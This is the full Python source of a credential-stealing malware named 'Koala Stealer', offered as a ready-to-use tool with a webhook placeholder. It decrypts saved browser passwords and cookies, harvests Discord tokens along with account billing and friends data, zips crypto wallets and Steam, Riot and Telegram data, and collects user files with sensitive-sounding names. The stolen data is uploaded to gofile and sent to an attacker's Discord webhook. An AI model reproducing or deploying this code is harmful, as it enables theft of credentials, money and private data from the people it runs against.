import os
import threading
from sys import executable
from sqlite3 import connect as sql_connect
import re
from base64 import b64decode
from json import loads as json_loads, load
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
from urllib.request import Request, urlopen
from json import *
import time
import shutil
from zipfile import ZipFile
import random
import re
import subprocess


hook = "PUT YOUR WEBHOOK HERE DO NOT DELETE THE COMMAS"


DETECTED = False

def getip():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except:
        pass
    return ip

requirements = [
    ["requests", "requests"],
    ["Crypto.Cipher", "pycryptodome"]
]
for modl in requirements:
    try: __import__(modl[0])
    except:
        subprocess.Popen(f"{executable} -m pip install {modl[1]}", shell=True)
        time.sleep(3)

import requests
from Crypto.Cipher import AES

local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')
temp = os.getenv("TEMP")
Threadlist = []


class DATA_BLOB(Structure):
    _fields_ = [
        ('cbData', wintypes.DWORD),
        ('pbData', POINTER(c_char))
    ]

def GetData(blob_out):
    cbData = int(blob_out.cbData)
    pbData = blob_out.pbData
    buffer = c_buffer(cbData)
    cdll.msvcrt.memcpy(buffer, pbData, cbData)
    windll.kernel32.LocalFree(pbData)
    return buffer.raw

def CryptUnprotectData(encrypted_bytes, entropy=b''):
    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
    buffer_entropy = c_buffer(entropy, len(entropy))
    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
    blob_out = DATA_BLOB()

    if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
        return GetData(blob_out)

def DecryptValue(buff, master_key=None):
    starts = buff.decode(encoding='utf8', errors='ignore')[:3]
    if starts == 'v10' or starts == 'v11':
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass

def LoadRequests(methode, url, data='', files='', headers=''):
    for i in range(8): # max trys
        try:
            if methode == 'POST':
                if data != '':
                    r = requests.post(url, data=data)
                    if r.status_code == 200:
                        return r
                elif files != '':
                    r = requests.post(url, files=files)
                    if r.status_code == 200 or r.status_code == 413:
                        return r
        except:
            pass

def LoadUrlib(hook, data='', files='', headers=''):
    for i in range(8):
        try:
            if headers != '':
                r = urlopen(Request(hook, data=data, headers=headers))
                return r
            else:
                r = urlopen(Request(hook, data=data))
                return r
        except: 
            pass

def globalInfo():
    ip = getip()
    username = os.getenv("USERNAME")
    ipdatanojson = urlopen(Request(f"https://geolocation-db.com/jsonp/{ip}")).read().decode().replace('callback(', '').replace('})', '}')
    # print(ipdatanojson)
    ipdata = loads(ipdatanojson)
    # print(urlopen(Request(f"https://geolocation-db.com/jsonp/{ip}")).read().decode())
    contry = ipdata["country_name"]
    contryCode = ipdata["country_code"].lower()
    sehir = ipdata["state"]

    globalinfo = f":flag_{contryCode}:  - `{username.upper()} | {ip} ({contry})`"
    return globalinfo


def Trust(Cookies):
    # simple Trust Factor system
    global DETECTED
    data = str(Cookies)
    tim = re.findall(".google.com", data)
    # print(len(tim))
    if len(tim) < -1:
        DETECTED = True
        return DETECTED
    else:
        DETECTED = False
        return DETECTED
        
def GetUHQFriends(token):
    badgeList =  [
        {"Name": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': "<:developer:874750808472825986> "},
        {"Name": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': "<:bughunter_2:874750808430874664> "},
        {"Name": 'Early_Supporter', 'Value': 512, 'Emoji': "<:early_supporter:874750808414113823> "},
        {"Name": 'House_Balance', 'Value': 256, 'Emoji': "<:balance:874750808267292683> "},
        {"Name": 'House_Brilliance', 'Value': 128, 'Emoji': "<:brilliance:874750808338608199> "},
        {"Name": 'House_Bravery', 'Value': 64, 'Emoji': "<:bravery:874750808388952075> "},
        {"Name": 'Bug_Hunter_Level_1', 'Value': 8, 'Emoji': "<:bughunter_1:874750808426692658> "},
        {"Name": 'HypeSquad_Events', 'Value': 4, 'Emoji': "<:hypesquad_events:874750808594477056> "},
        {"Name": 'Partnered_Server_Owner', 'Value': 2,'Emoji': "<:partner:874750808678354964> "},
        {"Name": 'Discord_Employee', 'Value': 1, 'Emoji': "<:staff:874750808728666152> "}
    ]
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        friendlist = loads(urlopen(Request("https://discord.com/api/v6/users/@me/relationships", headers=headers)).read().decode())
    except:
        return False

    uhqlist = ''
    for friend in friendlist:
        OwnedBadges = ''
        flags = friend['user']['public_flags']
        for badge in badgeList:
            if flags // badge["Value"] != 0 and friend['type'] == 1:
                if not "House" in badge["Name"]:
                    OwnedBadges += badge["Emoji"]
                flags = flags % badge["Value"]
        if OwnedBadges != '':
            uhqlist += f"{OwnedBadges} | {friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})\n"
    return uhqlist

def GetBilling(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        billingjson = loads(urlopen(Request("https://discord.com/api/users/@me/billing/payment-sources", headers=headers)).read().decode())
    except:
        return False
    
    if billingjson == []: return "```None```"

    billing = ""
    for methode in billingjson:
        if methode["invalid"] == False:
            if methode["type"] == 1:
                billing += ":credit_card:"
            elif methode["type"] == 2:
                billing += ":parking: "

    return billing


def GetBadge(flags):
    if flags == 0: return ''

    OwnedBadges = ''
    badgeList =  [
        {"Name": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': "<:developer:874750808472825986> "},
        {"Name": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': "<:bughunter_2:874750808430874664> "},
        {"Name": 'Early_Supporter', 'Value': 512, 'Emoji': "<:early_supporter:874750808414113823> "},
        {"Name": 'House_Balance', 'Value': 256, 'Emoji': "<:balance:874750808267292683> "},
        {"Name": 'House_Brilliance', 'Value': 128, 'Emoji': "<:brilliance:874750808338608199> "},
        {"Name": 'House_Bravery', 'Value': 64, 'Emoji': "<:bravery:874750808388952075> "},
        {"Name": 'Bug_Hunter_Level_1', 'Value': 8, 'Emoji': "<:bughunter_1:874750808426692658> "},
        {"Name": 'HypeSquad_Events', 'Value': 4, 'Emoji': "<:hypesquad_events:874750808594477056> "},
        {"Name": 'Partnered_Server_Owner', 'Value': 2,'Emoji': "<:partner:874750808678354964> "},
        {"Name": 'Discord_Employee', 'Value': 1, 'Emoji': "<:staff:874750808728666152> "}
    ]
    for badge in badgeList:
        if flags // badge["Value"] != 0:
            OwnedBadges += badge["Emoji"]
            flags = flags % badge["Value"]

    return OwnedBadges

def GetTokenInfo(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    userjson = loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers)).read().decode())
    username = userjson["username"]
    hashtag = userjson["discriminator"]
    email = userjson["email"]
    idd = userjson["id"]
    pfp = userjson["avatar"]
    flags = userjson["public_flags"]
    nitro = ""
    phone = ""

    if "premium_type" in userjson: 
        nitrot = userjson["premium_type"]
        if nitrot == 1:
            nitro = "<a:DE_BadgeNitro:865242433692762122>"
        elif nitrot == 2:
            nitro = "<a:DE_BadgeNitro:865242433692762122><a:autr_boost1:1038724321771786240>"
    if "phone" in userjson: phone = f'{userjson["phone"]}'

    return username, hashtag, email, idd, pfp, flags, nitro, phone

def checkToken(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers))
        return True
    except:
        return False

def uploadToken(token, path):
    global hook
    global tgmkx
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    username, hashtag, email, idd, pfp, flags, nitro, phone = GetTokenInfo(token)

    if pfp == None: 
        pfp = ""
    else:
        pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}"

    billing = GetBilling(token)
    badge = GetBadge(flags)
    friends = GetUHQFriends(token)
    if friends == '': friends = "```No Rare Friends```"
    if not billing:
        badge, phone, billing = "🔒", "🔒", "🔒"
    if nitro == '' and badge == '': nitro = "```None```"

    data = {
        "content": f'{globalInfo()} | `{path}`',
        "embeds": [
            {
            "color": 0000000,
            "fields": [
                {
                    "name": "<a:hyperNOPPERS:828369518199308388> Token:",
                    "value": f"```{token}```",
                    "inline": True
                },
                {
                    "name": "<:mail:750393870507966486> Email:",
                    "value": f"```{email}```",
                    "inline": True
                },
                {
                    "name": "<a:1689_Ringing_Phone:755219417075417088> Phone:",
                    "value": f"```{phone}```",
                    "inline": True
                },
                {
                    "name": "<:mc_earth:589630396476555264> IP:",
                    "value": f"```{getip()}```",
                    "inline": True
                },
                {
                    "name": "<:woozyface:874220843528486923> Badges:",
                    "value": f"{nitro}{badge}",
                    "inline": True
                },
                {
                    "name": "<a:4394_cc_creditcard_cartao_f4bihy:755218296801984553> Billing:",
                    "value": f"{billing}",
                    "inline": True
                },
                {
                    "name": "<a:mavikirmizi:853238372591599617> HQ Friends:",
                    "value": f"{friends}",
                    "inline": False
                }
                ],
            "author": {
                "name": f"{username}#{hashtag} ({idd})",
                "icon_url": f"{pfp}"
                },
            "footer": {
                "text": "Koala Stealer",
                "icon_url": "https://media.discordapp.net/attachments/919459616935542794/1069782679089852436/131-1317335_i-m-koala-koala-cartoon-png-transparent-png.png?width=510&height=576"
                },
            "thumbnail": {
                "url": f"{pfp}"
                }
            }
        ],
        "avatar_url": "https://media.discordapp.net/attachments/919459616935542794/1069782679089852436/131-1317335_i-m-koala-koala-cartoon-png-transparent-png.png?width=510&height=576",
        "username": "Koala Stealer",
        "attachments": []
        }
    LoadUrlib(hook, data=dumps(data).encode(), headers=headers)


def Reformat(listt):
    e = re.findall("(\w+[a-z])",listt)
    while "https" in e: e.remove("https")
    while "com" in e: e.remove("com")
    while "net" in e: e.remove("net")
    return list(set(e))

def upload(name, link):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    if name == "wpcook":
        rb = ' | '.join(da for da in cookiWords)
        if len(rb) > 1000: 
            rrrrr = Reformat(str(cookiWords))
            rb = ' | '.join(da for da in rrrrr)
        data = {
            "content": f"{globalInfo()}",
            "embeds": [
                {
                    "title": "Koala | Cookies Stealer",
                    "description": f"<:apollondelirmis:1012370180845883493>: **Accounts:**\n\n{rb}\n\n**Data:**\n<:cookies_tlm:816619063618568234> • **{CookiCount}** Cookies Found\n<a:CH_IconArrowRight:715585320178941993> • [KoalaCookies.txt]({link})",
                    "color": 000000,
                    "footer": {
                        "text": "Koala Stealer",
                        "icon_url": "https://media.discordapp.net/attachments/919459616935542794/1069782679089852436/131-1317335_i-m-koala-koala-cartoon-png-transparent-png.png?width=510&height=576"
                    }
                }
            ],
            "username": "Koala Stealer",
            "avatar_url": "https://media.discordapp.net/attachments/919459616935542794/1069782679089852436/131-1317335_i-m-koala-koala-cartoon-png-transparent-png.png?width=510&height=576",
            "attachments": []
            }
        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
        return

    if name == "wppassw":
        ra = ' | '.join(da for da in paswWords)
        if len(ra) > 1000: 
            rrr = Reformat(str(paswWords))
            ra = ' | '.join(da for da in rrr)

        data = {
            "content": f"{globalInfo()}",
            "embeds": [
                {
                    "title": "Koala | Password Stealer",
                    "description": f"<:apollondelirmis:1012370180845883493>: **Accounts**:\n{ra}\n\n**Data:**\n<a:hira_kasaanahtari:886942856969875476> • **{PasswCount}** Passwords Found\n<a:CH_IconArrowRight:715585320178941993> • [KoalaPassword.txt]({link})",
                    "color": 000000,
                    "footer": {
                        "text": "Koala Stealer",
                        "icon_url": "https://media.discordapp.net/attachments/919459616935542794/1069782679089852436/131-1317335_i-m-koala-koala-cartoon-png-transparent-png.png?width=510&height=576"
                    }
                }
            ],
            "username": "Koala",
            "avatar_url": "https://media.discordapp.net/attachments/919459616935542794/1069782679089852436/131-1317335_i-m-koala-koala-cartoon-png-transparent-png.png?width=510&height=576",
            "attachments": []
            }
        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
        return

    if name == "kiwi":
        data = {
            "content": f"{globalInfo()}",
            "embeds": [
                {
                "color": 000000,
                "fields": [
                    {
                    "name": "Interesting files found on user PC:",
                    "value": link
                    }
                ],
                "author": {
                    "name": "Koala | File Stealer"
                },
                "footer": {
                    "text": "Koala Stealer",
                    "icon_url": "https://media.discordapp.net/attachments/919459616935542794/1069782679089852436/131-1317335_i-m-koala-koala-cartoon-png-transparent-png.png?width=510&height=576"
                }
                }
            ],
            "username": "Koala Stealer",
            "avatar_url": "https://media.discordapp.net/attachments/919459616935542794/1069782679089852436/131-1317335_i-m-koala-koala-cartoon-png-transparent-png.png?width=510&height=576",
            "attachments": []
            }
        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
        return




# def upload(name, tk=''):
#     headers = {
#         "Content-Type": "application/json",
#         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
#     }

#     # r = requests.post(hook, files=files)
#     LoadRequests("POST", hook, files=files)
    _




def writeforfile(data, name):
    path = os.getenv("TEMP") + f"\wp{name}.txt"
    with open(path, mode='w', encoding='utf-8') as f:
        f.write(f"<--Koala STEALER BEST -->\n\n")
        for line in data:
            if line[0] != '':
                f.write(f"{line}\n")

Tokens = ''
def getToken(path, arg):
    if not os.path.exists(path): return

    path += arg
    for file in os.listdir(path):
        if file.endswith(".log") or file.endswith(".ldb")   :
            for line in [x.strip() for x in open(f"{path}\\{file}", errors="ignore").readlines() if x.strip()]:
                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", r"mfa\.[\w-]{80,95}"):
                    for token in re.findall(regex, line):
                        global Tokens
                        if checkToken(token):
                            if not token in Tokens:
                                # print(token)
                                Tokens += token
                                uploadToken(token, path)

Passw = []
def getPassw(path, arg):
    global Passw, PasswCount
    if not os.path.exists(path): return

    pathC = path + arg + "/Login Data"
    if os.stat(pathC).st_size == 0: return

    tempfold = temp + "wp" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"

    shutil.copy2(pathC, tempfold)
    conn = sql_connect(tempfold)
    cursor = conn.cursor()
    cursor.execute("SELECT action_url, username_value, password_value FROM logins;")
    data = cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)

    pathKey = path + "/Local State"
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])

    for row in data: 
        if row[0] != '':
            for wa in keyword:
                old = wa
                if "https" in wa:
                    tmp = wa
                    wa = tmp.split('[')[1].split(']')[0]
                if wa in row[0]:
                    if not old in paswWords: paswWords.append(old)
            Passw.append(f"UR1: {row[0]} | U53RN4M3: {row[1]} | P455W0RD: {DecryptValue(row[2], master_key)}")
            PasswCount += 1
    writeforfile(Passw, 'passw')

Cookies = []    
def getCookie(path, arg):
    global Cookies, CookiCount
    if not os.path.exists(path): return
    
    pathC = path + arg + "/Cookies"
    if os.stat(pathC).st_size == 0: return
    
    tempfold = temp + "wp" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
    
    shutil.copy2(pathC, tempfold)
    conn = sql_connect(tempfold)
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
    data = cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)

    pathKey = path + "/Local State"
    
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])

    for row in data: 
        if row[0] != '':
            for wa in keyword:
                old = wa
                if "https" in wa:
                    tmp = wa
                    wa = tmp.split('[')[1].split(']')[0]
                if wa in row[0]:
                    if not old in cookiWords: cookiWords.append(old)
            Cookies.append(f"{row[0]}	TRUE	/	FALSE	2597573456	{row[1]}	{DecryptValue(row[2], master_key)}")
            CookiCount += 1
    writeforfile(Cookies, 'cook')

def GetDiscord(path, arg):
    if not os.path.exists(f"{path}/Local State"): return

    pathC = path + arg

    pathKey = path + "/Local State"
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])
    # print(path, master_key)
    
    for file in os.listdir(pathC):
        # print(path, file)
        if file.endswith(".log") or file.endswith(".ldb")   :
            for line in [x.strip() for x in open(f"{pathC}\\{file}", errors="ignore").readlines() if x.strip()]:
                for token in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                    global Tokens
                    tokenDecoded = DecryptValue(b64decode(token.split('dQw4w9WgXcQ:')[1]), master_key)
                    if checkToken(tokenDecoded):
                        if not tokenDecoded in Tokens:
                            # print(token)
                            Tokens += tokenDecoded
                            # writeforfile(Tokens, 'tokens')
                            uploadToken(tokenDecoded, path)

def GatherZips(paths1, paths2, paths3):
    thttht = []
    for patt in paths1:
        a = threading.Thread(target=ZipThings, args=[patt[0], patt[5], patt[1]])
        a.start()
        thttht.append(a)

    for patt in paths2:
        a = threading.Thread(target=ZipThings, args=[patt[0], patt[2], patt[1]])
        a.start()
        thttht.append(a)
    
    a = threading.Thread(target=ZipTelegram, args=[paths3[0], paths3[2], paths3[1]])
    a.start()
    thttht.append(a)

    for thread in thttht: 
        thread.join()
    global WalletsZip, GamingZip, OtherZip
        # print(WalletsZip, GamingZip, OtherZip)

    wal, ga, ot = "",'',''
    if not len(WalletsZip) == 0:
        wal = ":coin:  •  Wallets\n"
        for i in WalletsZip:
            wal += f"└─ [{i[0]}]({i[1]})\n"
    if not len(WalletsZip) == 0:
        ga = ":video_game:  •  Gaming:\n"
        for i in GamingZip:
            ga += f"└─ [{i[0]}]({i[1]})\n"
    if not len(OtherZip) == 0:
        ot = ":tickets:  •  Apps\n"
        for i in OtherZip:
            ot += f"└─ [{i[0]}]({i[1]})\n"          
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    
    data = {
        "content": globalInfo(),
        "embeds": [
            {
            "title": "Koala Zips",
            "description": f"{wal}\n{ga}\n{ot}",
            "color": 000000,
            "footer": {
                "text": "Koala Stealer",
                "icon_url": "https://media.discordapp.net/attachments/919459616935542794/1069782679089852436/131-1317335_i-m-koala-koala-cartoon-png-transparent-png.png?width=510&height=576"
            }
            }
        ],
        "username": "Koala Stealer",
        "avatar_url": "https://media.discordapp.net/attachments/919459616935542794/1069782679089852436/131-1317335_i-m-koala-koala-cartoon-png-transparent-png.png?width=510&height=576",
        "attachments": []
    }
    LoadUrlib(hook, data=dumps(data).encode(), headers=headers)


def ZipTelegram(path, arg, procc):
    global OtherZip
    pathC = path
    name = arg
    if not os.path.exists(pathC): return
    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)

    zf = ZipFile(f"{pathC}/{name}.zip", "w")
    for file in os.listdir(pathC):
        if not ".zip" in file and not "tdummy" in file and not "user_data" in file and not "webview" in file: 
            zf.write(pathC + "/" + file)
    zf.close()

    lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')
    #lnik = "https://google.com"
    os.remove(f"{pathC}/{name}.zip")
    OtherZip.append([arg, lnik])

def ZipThings(path, arg, procc):
    pathC = path
    name = arg
    global WalletsZip, GamingZip, OtherZip
    # subprocess.Popen(f"taskkill /im {procc} /t /f", shell=True)
    # os.system(f"taskkill /im {procc} /t /f")

    if "nkbihfbeogaeaoehlefnkodbefgpgknn" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Metamask_{browser}"
        pathC = path + arg
    
    if not os.path.exists(pathC): return
    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)

    if "Wallet" in arg or "NationsGlory" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"{browser}"

    elif "Steam" in arg:
        if not os.path.isfile(f"{pathC}/loginusers.vdf"): return
        f = open(f"{pathC}/loginusers.vdf", "r+", encoding="utf8")
        data = f.readlines()
        # print(data)
        found = False
        for l in data:
            if 'RememberPassword"\t\t"1"' in l:
                found = True
        if found == False: return
        name = arg


    zf = ZipFile(f"{pathC}/{name}.zip", "w")
    for file in os.listdir(pathC):
        if not ".zip" in file: zf.write(pathC + "/" + file)
    zf.close()

    lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')
    #lnik = "https://google.com"
    os.remove(f"{pathC}/{name}.zip")

    if "Wallet" in arg or "eogaeaoehlef" in arg:
        WalletsZip.append([name, lnik])
    elif "NationsGlory" in name or "Steam" in name or "RiotCli" in name:
        GamingZip.append([name, lnik])
    else:
        OtherZip.append([name, lnik])


def GatherAll():
    '                   Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >              Password < 3 >     Cookies < 4 >                          Extentions < 5 >                                  '
    browserPaths = [
        [f"{roaming}/Opera Software/Opera GX Stable",               "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
        [f"{roaming}/Opera Software/Opera Stable",                  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
        [f"{roaming}/Opera Software/Opera Neon/User Data/Default",  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/Google/Chrome SxS/User Data",                    "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/BraveSoftware/Brave-Browser/User Data",          "brave.exe",    "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/Yandex/YandexBrowser/User Data",                 "yandex.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn"                                    ],
        [f"{local}/Microsoft/Edge/User Data",                       "edge.exe",     "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ]
    ]

    discordPaths = [
        [f"{roaming}/Discord", "/Local Storage/leveldb"],
        [f"{roaming}/Lightcord", "/Local Storage/leveldb"],
        [f"{roaming}/discordcanary", "/Local Storage/leveldb"],
        [f"{roaming}/discordptb", "/Local Storage/leveldb"],
    ]

    PathsToZip = [
        [f"{roaming}/atomic/Local Storage/leveldb", '"Atomic Wallet.exe"', "Wallet"],
        [f"{roaming}/Exodus/exodus.wallet", "Exodus.exe", "Wallet"],
        ["C:\Program Files (x86)\Steam\config", "steam.exe", "Steam"],
        [f"{roaming}/NationsGlory/Local Storage/leveldb", "NationsGlory.exe", "NationsGlory"],
        [f"{local}/Riot Games/Riot Client/Data", "RiotClientServices.exe", "RiotClient"]
    ]
    Telegram = [f"{roaming}/Telegram Desktop/tdata", 'telegram.exe', "Telegram"]

    for patt in browserPaths: 
        a = threading.Thread(target=getToken, args=[patt[0], patt[2]])
        a.start()
        Threadlist.append(a)
    for patt in discordPaths: 
        a = threading.Thread(target=GetDiscord, args=[patt[0], patt[1]])
        a.start()
        Threadlist.append(a)

    for patt in browserPaths: 
        a = threading.Thread(target=getPassw, args=[patt[0], patt[3]])
        a.start()
        Threadlist.append(a)

    ThCokk = []
    for patt in browserPaths: 
        a = threading.Thread(target=getCookie, args=[patt[0], patt[4]])
        a.start()
        ThCokk.append(a)

    threading.Thread(target=GatherZips, args=[browserPaths, PathsToZip, Telegram]).start()


    for thread in ThCokk: thread.join()
    DETECTED = Trust(Cookies)
    if DETECTED == True: return

    for patt in browserPaths:
         threading.Thread(target=ZipThings, args=[patt[0], patt[5], patt[1]]).start()
    
    for patt in PathsToZip:
         threading.Thread(target=ZipThings, args=[patt[0], patt[2], patt[1]]).start()
    
    threading.Thread(target=ZipTelegram, args=[Telegram[0], Telegram[2], Telegram[1]]).start()

    for thread in Threadlist: 
        thread.join()
    global upths
    upths = []

    for file in ["wppassw.txt", "wpcook.txt"]: 
        # upload(os.getenv("TEMP") + "\\" + file)
        upload(file.replace(".txt", ""), uploadToAnonfiles(os.getenv("TEMP") + "\\" + file))

def uploadToAnonfiles(path):
    try:return requests.post(f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile', files={'file': open(path, 'rb')}).json()["data"]["downloadPage"]
    except:return False

# def uploadToAnonfiles(path):s
#     try:
#         files = { "file": (path, open(path, mode='rb')) }
#         upload = requests.post("https://transfer.sh/", files=files)
#         url = upload.text
#         return url
#     except:
#         return False

def KiwiFolder(pathF, keywords):
    global KiwiFiles
    maxfilesperdir = 7
    i = 0
    listOfFile = os.listdir(pathF)
    ffound = []
    for file in listOfFile:
        if not os.path.isfile(pathF + "/" + file): return
        i += 1
        if i <= maxfilesperdir:
            url = uploadToAnonfiles(pathF + "/" + file)
            ffound.append([pathF + "/" + file, url])
        else:
            break
    KiwiFiles.append(["folder", pathF + "/", ffound])

KiwiFiles = []
def KiwiFile(path, keywords):
    global KiwiFiles
    fifound = []
    listOfFile = os.listdir(path)
    for file in listOfFile:
        for worf in keywords:
            if worf in file.lower():
                if os.path.isfile(path + "/" + file) and ".txt" in file:
                    fifound.append([path + "/" + file, uploadToAnonfiles(path + "/" + file)])
                    break
                if os.path.isdir(path + "/" + file):
                    target = path + "/" + file
                    KiwiFolder(target, keywords)
                    break

    KiwiFiles.append(["folder", path, fifound])

def Kiwi():
    user = temp.split("\AppData")[0]
    path2search = [
        user + "/Desktop",
        user + "/Downloads",
        user + "/Documents"
    ]

    key_wordsFolder = [
        "account",
        "acount",
        "passw",
        "secret"

    ]

    key_wordsFiles = [
        "passw",
        "mdp",
        "motdepasse",
        "mot_de_passe",
        "login",
        "secret",
        "account",
        "acount",
        "paypal",
        "banque",
        "account",                                                          
        "metamask",
        "wallet",
        "crypto",
        "exodus",
        "discord",
        "2fa",
        "code",
        "memo",
        "compte",
        "token",
        "backup",
        "secret",
        "mom",
        "family"
        ]

    wikith = []
    for patt in path2search: 
        kiwi = threading.Thread(target=KiwiFile, args=[patt, key_wordsFiles]);kiwi.start()
        wikith.append(kiwi)
    return wikith


global keyword, cookiWords, paswWords, CookiCount, PasswCount, WalletsZip, GamingZip, OtherZip

keyword = [
    'mail', '[coinbase](https://coinbase.com)', '[sellix](https://sellix.io)', '[gmail](https://gmail.com)', '[steam](https://steam.com)', '[discord](https://discord.com)', '[riotgames](https://riotgames.com)', '[youtube](https://youtube.com)', '[instagram](https://instagram.com)', '[tiktok](https://tiktok.com)', '[twitter](https://twitter.com)', '[facebook](https://facebook.com)', 'card', '[epicgames](https://epicgames.com)', '[spotify](https://spotify.com)', '[yahoo](https://yahoo.com)', '[roblox](https://roblox.com)', '[twitch](https://twitch.com)', '[minecraft](https://minecraft.net)', 'bank', '[paypal](https://paypal.com)', '[origin](https://origin.com)', '[amazon](https://amazon.com)', '[ebay](https://ebay.com)', '[aliexpress](https://aliexpress.com)', '[playstation](https://playstation.com)', '[hbo](https://hbo.com)', '[xbox](https://xbox.com)', 'buy', 'sell', '[binance](https://binance.com)', '[hotmail](https://hotmail.com)', '[outlook](https://outlook.com)', '[crunchyroll](https://crunchyroll.com)', '[telegram](https://telegram.com)', '[pornhub](https://pornhub.com)', '[disney](https://disney.com)', '[expressvpn](https://expressvpn.com)', 'crypto', '[uber](https://uber.com)', '[netflix](https://netflix.com)'
]

CookiCount, PasswCount = 0, 0
cookiWords = []
paswWords = []

WalletsZip = [] # [Name, Link]
GamingZip = []
OtherZip = []

GatherAll()
DETECTED = Trust(Cookies)
# DETECTED = False
if not DETECTED:
    wikith = Kiwi()

    for thread in wikith: thread.join()
    time.sleep(0.2)

    filetext = "\n"
    for arg in KiwiFiles:
        if len(arg[2]) != 0:
            foldpath = arg[1]
            foldlist = arg[2]       
            filetext += f"📁 {foldpath}\n"

            for ffil in foldlist:
                a = ffil[0].split("/")
                fileanme = a[len(a)-1]
                b = ffil[1]
                filetext += f"└─:open_file_folder: [{fileanme}]({b})\n"
            filetext += "\n"
    upload("kiwi", filetext)


#pip install pycryptodome
import random ,base64,codecs,zlib;pyobfuscate=""

